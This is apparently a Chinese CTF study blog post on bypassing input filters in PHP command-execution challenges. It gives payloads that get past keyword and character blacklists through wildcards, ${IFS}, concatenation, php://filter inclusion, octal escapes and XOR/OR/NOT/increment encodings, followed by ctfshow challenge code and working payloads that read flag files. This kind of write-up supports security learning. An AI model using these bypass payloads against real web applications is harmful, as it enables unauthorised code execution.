<!DOCTYPE html><html lang="cn" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>命令执行 | RngAd33的网络安全笔记</title><link rel="icon" type="image/x-icon" href="/blog233.github.io/favicon.ico"><link rel="preload" as="font" crossorigin="anonymous" href="/blog233.github.io/font/Bender.ttf"><link rel="preload" as="font" crossorigin="anonymous" href="/blog233.github.io/font/BenderLight.ttf"><link rel="preload" as="font" crossorigin="anonymous" href="/blog233.github.io/font/JetBrainsMono-Regular.woff2"><link rel="stylesheet" href="/blog233.github.io/css/arknights.css"><style>@font-face {
  font-family: Bender;
  src: local('Bender'), url("/blog233.github.io/font/Bender.ttf"), url("/blog233.github.io/font/Bender.otf");
}
@font-face {
  font-family: BenderLight;
  src: local('BenderLight'), url("/blog233.github.io/font/BenderLight.ttf");
}
@font-face {
  font-family: 'JetBrains Mono';
  src: local('JetBrains Mono'), url('/blog233.github.io/font/JetBrainsMono-Regular.woff2') format('woff2');
}
</style><script>var config = {"root":"/blog233.github.io/","search":{"preload":false,"activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"copy"}}</script><link type="text/css" rel="stylesheet" href="/blog233.github.io/lib/encrypt/hbe.style.css"><script src="//unpkg.com/mermaid@10.5.0/dist/mermaid.min.js"></script><script src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.6.1/MathJax.js"></script><script>MathJax.Hub.Config({
 menuSettings: {
   zoom: "None"
 },
 showMathMenu: false,
 jax: ["input/TeX","output/CommonHTML"],
 extensions: ["tex2jax.js"],
 TeX: {
   extensions: ["AMSmath.js","AMSsymbols.js"],
   equationNumbers: {
     autoNumber: "AMS"
   }
 },
 tex2jax: {
   inlineMath: [["\\(", "\\)"]],
   displayMath: [["\\[", "\\]"]]
 }
});</script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/blog233.github.io/lib/fontawesome/css/all.min.css"><script>if (window.localStorage.getItem('theme-mode') === 'light')
 document.documentElement.setAttribute('theme-mode', 'light')
if (window.localStorage.getItem('theme-mode') === 'dark')
 document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
 font-family: BenderLight;
 src: local('Bender'), url("/blog233.github.io/font/BenderLight.woff2") format('woff2');
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/blog233.github.io/font/JetBrainsMono-Regular.woff2') format('woff2');
}</style><style>:root {
 --dark-background: url('/blog233.github.io/img/bg.webp');
 --light-background: url('/blog233.github.io/img/bk.webp');
 --theme-encrypt-confirm: 'confirm'
}</style><script defer src="/blog233.github.io/js/arknights.js"></script><script defer src="/blog233.github.io/js/search.js"></script><script defer type="module">import mermaid from '//unpkg.com/mermaid@10.5.0/dist/mermaid.esm.mjs';
window.mermaid = mermaid;
code.paintMermaid();
</script><script src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.6.1/MathJax.js"></script><script>MathJax.Hub.Config({
  menuSettings: {
    zoom: "None"
  },
  showMathMenu: false,
  jax: ["input/TeX","output/CommonHTML"],
  extensions: ["tex2jax.js"],
  TeX: {
    extensions: ["AMSmath.js","AMSsymbols.js"],
    equationNumbers: {
      autoNumber: "AMS"
    }
  },
  tex2jax: {
    inlineMath: [["\\(", "\\)"]],
    displayMath: [["\\[", "\\]"]]
  }
});
</script><script async src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script async src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script async src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script async src="/blog233.github.io/lib/encrypt/hbe.js"></script><script async src="/blog233.github.io/js/pjax.js"></script><script class="pjax-js">reset= () => {document.querySelector('.lg-container')?.remove()
lightGallery(document.getElementById('post-bg'), {
  plugins: [lgZoom,lgThumbnail],
  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
 cacheBust: false,
 selectors: ['title','article','#aside-block','.pjax-js','data-pjax','.busuanzi'],
 switches: {'article': Pjax.switches.sideBySide},
 switchesOptions: {
   'article': {
     classNames: {
       remove: "pjax-out",
       add: "pjax-in"
     }
   }
 }
});
document.addEventListener("pjax:complete", reset);reset()})</script><script class="pjax-js">reset= () => {document.querySelector('.lg-container')?.remove()
lightGallery(document.getElementById('post-bg'), {
  plugins: [lgZoom,lgThumbnail],
  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
 cacheBust: false,
 selectors: ['title','article','#aside-block','.pjax-js'],
 switches: {'article': Pjax.switches.sideBySide},
 switchesOptions: {
   'article': {
     classNames: {
       remove: "pjax-out",
       add: "pjax-in"
     }
   }
 }
});
document.addEventListener("pjax:complete", reset);reset()})</script><meta name="generator" content="Hexo 7.3.0"></head><body><div class="loading" style="opacity: 0;"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><nav><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup" tabindex="0"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/blog233.github.io/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/blog233.github.io/archives/"><span class="navItemTitle">Archives</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>命令执行</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2024-09-21T15:10:18.357Z" id="date"> 2024-09-21</time></div></span><br><span>Last Update: <div class="control"><time datetime="2025-01-23T13:04:27.049Z" id="updated"> 2025-01-23</time></div></span></div></div><hr><div id="post-content"><p>安全无止境，继续前进吧！</p>
<p>罗德岛的PRTS依赖于强大的网络系统，<br>相应地，网络安全尤为重要，这关乎全岛各项事务的正常运作，<br>希望你能够以身作则，祝你好运。<br>–by Kal’tsit</p>
<p class='item-img' data-src='/blog233.github.io/./img/121663271_p0.webp'><img src="/blog233.github.io/./img/121663271_p0.webp"></p>
<h1 id="绕过严格过滤"><a href="#绕过严格过滤" class="headerlink" title="绕过严格过滤"></a>绕过严格过滤</h1><p><strong>命令执行，需要严格的过滤；攻击者需要想方设法绕过重重过滤</strong></p>
<h2 id="敏感词汇过滤"><a href="#敏感词汇过滤" class="headerlink" title="敏感词汇过滤"></a>敏感词汇过滤</h2><ol>
<li><p>文件名&#x2F;扩展名过滤<br> 使用*或?替换掉部分文件名和扩展名，前者可以替换掉一个字符，后者可以一次替换掉多个字符;<br> 或者在词汇中间插入’’或者\绕过检测；</p>
</li>
<li><p>高级版文件名&#x2F;扩展名过滤<br> 在第一个的基础上做了升级。比如要过滤关键词’tac’，凡是传入的参数当中按顺序出现了’t’’a’’c’这三个字符，参数就会被过滤；<br> 此时第一个方法就不好用了，需要在省略部分字符的同时下加上路径&#x2F;bin&#x2F;，否则系统无法匹配命令；</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">?file=/bin/cat index.php<br>-&gt;?file=/bin/ca?$&#123;IFS&#125;?????.??? <br></code></pre></td></tr></table></figure>
</li>
<li><p>函数名过滤<br> 当system被过滤时，使用echo `command`;执行系统命令；<br> 如果echo也被过滤，使用nl命令（该命令无回显，需要手动查看网页源代码）；</p>
</li>
<li><p>拼接法<br> 通过构造与调用参数拼接敏感词汇，也能够绕过检测；</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">?file=<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;ls&#x27;</span>);<br>-&gt;?file=<span class="hljs-variable">$a</span>=sys;<span class="hljs-variable">$b</span>=tem;<span class="hljs-variable">$c</span>=<span class="hljs-variable">$a</span>.<span class="hljs-variable">$b</span>;<span class="hljs-variable">$c</span>(<span class="hljs-string">&#x27;ls&#x27;</span>);<br></code></pre></td></tr></table></figure>
</li>
<li><p>包含法<br> 利用到了文件包含漏洞当中的filter包含，还挺好用（详解见：漏洞利用）；</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?file=<span class="hljs-keyword">include</span><span class="hljs-variable">$_GET</span>[url]<span class="hljs-meta">?&gt;</span>&amp;url=php:<span class="hljs-comment">//filter/read=convert.base64-encode/resource=index.php</span><br></code></pre></td></tr></table></figure></li>
</ol>
<h2 id="敏感字符过滤"><a href="#敏感字符过滤" class="headerlink" title="敏感字符过滤"></a>敏感字符过滤</h2><ol>
<li><p>分号’;’过滤<br> 使用%0a代替分号；</p>
</li>
<li><p>空格’%20’过滤<br> 在echo没有被过滤的情况下，使用$IFS（echo适用）或${IFS}代替空格；<br> 如果echo被过滤，使用%09代替空格（%09是Tab键的url编码）；<br> 如果$或{}或IFS被过滤，使用+代替空格（+会被解释成空格）；<br> 此外，也可以获取并调用php环境中与空格等效的标识符；</p>
</li>
<li><p>问号’?’过滤<br> 使用不含问号的javascript语句构造PHP命令：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">?file=<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;ls&#x27;</span>);<br>-&gt;?file=&lt;script language=<span class="hljs-string">&#x27;php&#x27;</span>&gt;<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;ls&#x27;</span>);&lt;/script&gt;<br></code></pre></td></tr></table></figure>
</li>
<li><p>点’.’过滤<br> 使用以下语句构造’.’：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">pos</span>(<span class="hljs-title function_ invoke__">localeconv</span>())<br><span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-title function_ invoke__">ceil</span>(<span class="hljs-title function_ invoke__">sinh</span>(<span class="hljs-title function_ invoke__">cosh</span>(<span class="hljs-title function_ invoke__">tan</span>(<span class="hljs-title function_ invoke__">floor</span>(<span class="hljs-title function_ invoke__">sqrt</span>(<span class="hljs-title function_ invoke__">floor</span>(<span class="hljs-title function_ invoke__">phpversion</span>()))))))))<br></code></pre></td></tr></table></figure>
<p>此外，还可以用句号’。’代替’.’</p>
</li>
</ol>
<h2 id="全数字过滤"><a href="#全数字过滤" class="headerlink" title="全数字过滤"></a>全数字过滤</h2><p>利用Linux系统中的$(())构造数字：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">$&#123;_&#125; = <span class="hljs-string">&quot;&quot;</span>  <span class="hljs-comment">//返回上一次命令</span><br>$(($&#123;_&#125;)) = <span class="hljs-number">0</span><br>$((~$(($&#123;_&#125;)))) = -<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>

<h2 id="全字母过滤"><a href="#全字母过滤" class="headerlink" title="全字母过滤"></a>全字母过滤</h2><p>所有字母均被过滤时，考虑使用以下方法：</p>
<ol>
<li><p>通配符替换<br> 使用’?’或’*‘替换字符，其中’?’一次只能替换一个字符，’*‘一次可以替换多个字符；</p>
</li>
<li><p>bash无字母命令执行<br> 使用$’\num1\num2\……\numn’替换传统命令（其中的num均为对应字符的ASCII码的八进制形式）；</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">?file=tac flag.php<br>-&gt;?file=$<span class="hljs-string">&#x27;\164\141\143&#x27;</span> $<span class="hljs-string">&#x27;\146\154\141\147\56\160\150\160&#x27;</span><br></code></pre></td></tr></table></figure></li>
</ol>
<h2 id="全数字、全字母过滤"><a href="#全数字、全字母过滤" class="headerlink" title="全数字、全字母过滤"></a>全数字、全字母过滤</h2><p>如果遇到了所有字母和数字都被过滤的极端情况，有以下几种方法绕过：</p>
<ol>
<li>php异或<br> 将系统命令异或处理后传入（需要保证密文和密钥的url解码结果均不包含字母和数字）；<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;ls&#x27;</span>);<br>-&gt;(<span class="hljs-string">&quot;%08%02%08%08%05%0d&quot;</span>^<span class="hljs-string">&quot;%7b%7b%7b%7c%60%60&quot;</span>)(<span class="hljs-string">&quot;%0c%08&quot;</span>^<span class="hljs-string">&quot;%60%7b&quot;</span>);<br><br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;tac flag.php&#x27;</span>);<br>-&gt;(<span class="hljs-string">&quot;%08%02%08%08%05%0d&quot;</span>^<span class="hljs-string">&quot;%7b%7b%7b%7c%60%60&quot;</span>)(<span class="hljs-string">&quot;%08%01%03%00%06%0c%01%07%00%0b%08%0b&quot;</span>^<span class="hljs-string">&quot;%7c%60%60%20%60%60%60%60%2e%7b%60%7b&quot;</span>);<br></code></pre></td></tr></table></figure></li>
<li>php或<br> 与异或相似，操作是差不多的；<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;ls&#x27;</span>);<br>-&gt;(<span class="hljs-string">&quot;%13%19%13%14%05%0d&quot;</span>|<span class="hljs-string">&quot;%60%60%60%60%60%60&quot;</span>)(<span class="hljs-string">&quot;%0c%13&quot;</span>|<span class="hljs-string">&quot;%60%60&quot;</span>);<br><br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;tac flag.php&#x27;</span>);<br>-&gt;(<span class="hljs-string">&quot;%13%19%13%14%05%0d&quot;</span>|<span class="hljs-string">&quot;%60%60%60%60%60%60&quot;</span>)(<span class="hljs-string">&quot;%14%01%03%00%06%0c%01%07%00%10%08%10&quot;</span>|<span class="hljs-string">&quot;%60%60%60%20%60%60%60%60%2e%60%60%60&quot;</span>);<br></code></pre></td></tr></table></figure></li>
<li>php自增<br><strong>PHP7.0.12以上版本不可用</strong><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">assert</span>(<span class="hljs-variable">$_POST</span>[_]);<br>-&gt;<span class="hljs-variable">$_</span>=[];<span class="hljs-variable">$_</span>=@<span class="hljs-string">&quot;<span class="hljs-subst">$_</span>&quot;</span>;<span class="hljs-variable">$_</span>=<span class="hljs-variable">$_</span>[<span class="hljs-string">&#x27;!&#x27;</span>==<span class="hljs-string">&#x27;@&#x27;</span>];<span class="hljs-variable">$___</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>;<span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>;<span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>;<span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>;<span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>;<span class="hljs-variable">$____</span>=<span class="hljs-string">&#x27;_&#x27;</span>;<span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$____</span>.=<span class="hljs-variable">$__</span>;<span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$____</span>.=<span class="hljs-variable">$__</span>;<span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$____</span>.=<span class="hljs-variable">$__</span>;<span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$____</span>.=<span class="hljs-variable">$__</span>;<span class="hljs-variable">$_</span>=<span class="hljs-variable">$$____</span>;<span class="hljs-variable">$___</span>(<span class="hljs-variable">$_</span>[_]);<br></code></pre></td></tr></table></figure></li>
<li>php取反<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;ls&#x27;</span>);<br>-&gt;(~%<span class="hljs-number">8</span>C%<span class="hljs-number">86</span>%<span class="hljs-number">8</span>C%<span class="hljs-number">8</span>B%<span class="hljs-number">9</span>A%<span class="hljs-number">92</span>)(~%<span class="hljs-number">93</span>%<span class="hljs-number">8</span>C);<br><br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;tac flag.php&#x27;</span>);<br>-&gt;(~%<span class="hljs-number">8</span>C%<span class="hljs-number">86</span>%<span class="hljs-number">8</span>C%<span class="hljs-number">8</span>B%<span class="hljs-number">9</span>A%<span class="hljs-number">92</span>)(~%<span class="hljs-number">8</span>B%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>C%DF%<span class="hljs-number">99</span>%<span class="hljs-number">93</span>%<span class="hljs-number">9</span>E%<span class="hljs-number">98</span>%D1%<span class="hljs-number">8</span>F%<span class="hljs-number">97</span>%<span class="hljs-number">8</span>F);<br></code></pre></td></tr></table></figure>
<strong>请注意：在Linux系统中，system()函数不支持以上操作！</strong><br><strong>此外，当 $、+、-、^、~、|、% 这些字符被过滤后，以上方法将失效！</strong></li>
</ol>
<h2 id="举些例子（以下题目来自ctfshow）："><a href="#举些例子（以下题目来自ctfshow）：" class="headerlink" title="举些例子（以下题目来自ctfshow）："></a>举些例子（以下题目来自ctfshow）：</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>    <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><br>考点：敏感词汇过滤<br><br>payload:<br>    ?c=<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;ls&#x27;</span>);<br>    ?c=<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;tac fl*g.php&#x27;</span>);<br></code></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag|system|php/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>    <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><br>考点：敏感词汇过滤<br><br>payload:<br>    ?c=<span class="hljs-keyword">echo</span> `ls`;<br>    ?c=<span class="hljs-keyword">echo</span> `tac fl*g.*`;       <span class="hljs-comment">// 通配符</span><br>    ?c=<span class="hljs-keyword">echo</span> `tac fl?g.???`;     <span class="hljs-comment">// 通配符</span><br>    ?c=<span class="hljs-keyword">echo</span> `nl fl<span class="hljs-string">&#x27;&#x27;</span>ag.p<span class="hljs-string">&#x27;&#x27;</span>hp`;  <span class="hljs-comment">// 适用于*被过滤的情况，运行后无回显，需要手动查看源代码</span><br>    拼接法：<br>    ?c=<span class="hljs-variable">$a</span>=sys;<span class="hljs-variable">$b</span>=tem;<span class="hljs-variable">$c</span>=<span class="hljs-variable">$a</span>.<span class="hljs-variable">$b</span>;<span class="hljs-variable">$c</span>(<span class="hljs-string">&#x27;ls&#x27;</span>);<br>    ?c=<span class="hljs-variable">$a</span>=sys;<span class="hljs-variable">$b</span>=tem;<span class="hljs-variable">$c</span>=<span class="hljs-string">&quot;$&#123;a&#125;$&#123;b&#125;&quot;</span>;<span class="hljs-variable">$c</span>(<span class="hljs-string">&#x27;tac fl*g.*&#x27;</span>);<br></code></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>    <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br>考点：敏感词汇过滤、敏感字符过滤<br><br>payload:<br>    ?c=<span class="hljs-keyword">include</span><span class="hljs-variable">$_GET</span>[url]<span class="hljs-meta">?&gt;</span>&amp;url=php:<span class="hljs-comment">//filter/read=convert.base64-encode/resource=flag.php</span><br>&#125;<br></code></pre></td></tr></table></figure>
